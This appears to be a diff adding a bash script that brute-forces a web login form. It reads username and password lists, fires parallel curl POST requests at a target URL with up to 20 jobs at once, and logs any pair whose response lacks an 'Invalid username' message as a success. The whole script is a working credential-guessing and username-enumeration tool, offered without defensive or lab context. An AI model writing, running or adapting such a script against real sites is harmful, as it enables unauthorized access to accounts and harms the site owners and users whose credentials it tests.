@@ -1,0 +1,32 @@
+#!/usr/bin/bash
+
+usernames=$1
+passwords=$2
+url=$3
+threads=20
+
+login() {
+	response=$(curl -s -X POST -d "username=$1&password=$2" "$url")
+	if ! echo "$response" | grep "Invalid username"; then
+		echo "[SUCCESS] $1:$2"
+		echo $1 >> valid_usernames
+	else
+		echo "[*] Trying"
+	fi
+}
+
+running_jobs() {
+	jobs -rp | wc -l
+}
+
+for user in $(cat "$usernames"); do
+	for pass in $(cat "$passwords"); do
+		while [ "$(running_jobs)" -ge "$threads" ]; do
+			sleep 0.1
+		done
+
+		login "$user" "$pass" &
+	done
+done
+
+wait
